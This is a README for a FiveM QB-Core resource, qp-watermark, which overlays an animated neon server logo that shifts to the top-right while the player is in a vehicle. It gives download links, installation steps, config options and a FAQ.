# qp-watermark v1.0 - FiveM Watermark Overlay 2026

> **A compact FiveM watermark resource for QB-Core servers.** Adds a custom logo overlay with neon motion and shifts automatically to the top-right corner whenever the player enters a vehicle.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM%20(GTA%20V)-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/evan-taylor82/qp-watermark-script?style=flat-square)](https://github.com/evan-taylor82/qp-watermark-script)

---

<p align="center">
  <a href="https://evan-taylor82.github.io/qp-watermark-script/">
    <img src="https://img.shields.io/badge/Download-qp-watermark%20Script-brightgreen?style=for-the-badge" alt="Download qp-watermark Script">
  </a>
</p>

> **[Direct Download - qp-watermark](https://evan-taylor82.github.io/qp-watermark-script/)**

---

[Download Latest Build](https://evan-taylor82.github.io/qp-watermark-script/)

---

## What it does

qp-watermark provides a polished, animated logo overlay for FiveM servers using the QB-Core framework. It keeps a server watermark visible on the player's screen, with a subtle neon glow that helps the branding stand out without taking over the HUD. As soon as the player gets into a vehicle, the overlay moves to the top-right area to stay readable and out of the way.

The resource is built around identity and presentation. It stays lightweight, needs very little setup, and fits cleanly into existing QB-Core servers. This release also tightens animation timing and keeps placement consistent across different resolutions and aspect ratios.

## Features

- Renders a custom logo or text watermark continuously on the player's HUD
- Uses a neon pulsing effect for a more refined visual style
- Automatically moves the watermark to the top-right while in a vehicle
- Restores the default location after exiting a vehicle
- Works with QB-Core immediately after installation
- Lightweight and free of extra dependencies
- Easy configuration for logo path and on-screen behavior

## Installation

1. Download the latest build from the link above.
2. Extract the `qp-watermark-script` folder into your server's `resources` directory.
3. Add `ensure qp-watermark-script` to your server configuration file (e.g., `server.cfg`).
4. Restart your server or use the `refresh` and `start qp-watermark-script` commands.

Example resource placement:
```
resources/[local]/qp-watermark-script/
```

## Configuration

All settings are managed in `config.lua`. The available options are listed below:

| Setting | Default Value | Description |
|---------|---------------|-------------|
| `Config.LogoPath` | `"nui://qp-watermark-script/html/logo.png"` | Path to the logo image file |
| `Config.AnimationSpeed` | `0.5` | Neon animation speed in seconds |
| `Config.DefaultPosition` | `"bottom-left"` | Default watermark position on screen |
| `Config.VehiclePosition` | `"top-right"` | Watermark position when in a vehicle |

## Compatibility

- **Platform:** FiveM (Grand Theft Auto V)
- **Framework:** QB-Core
- **Supported Game Versions:** Latest FiveM builds (2025+)
- **Known Limitations:** May not function correctly on non-QB-Core frameworks without modification. Logo image must be a PNG file with transparency for best results.

## FAQ

**How do I get it running for the first time?**  
Download the latest build, place the folder in your resources, add it to your server config, and restart the server.

**How do I change the logo image?**  
Replace the `logo.png` file in the `html` folder with the image you want to use, or update `Config.LogoPath` in `config.lua` to point elsewhere.

**Can the animation speed be adjusted?**  
Yes. Change `Config.AnimationSpeed` in `config.lua`. Smaller values make the pulsing faster.

**Will this work on frameworks other than QB-Core?**  
It is made for QB-Core. Other frameworks may need code adjustments.

**Is the watermark saved anywhere?**  
No. The watermark is drawn client-side and does not store data on the server or in client storage.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
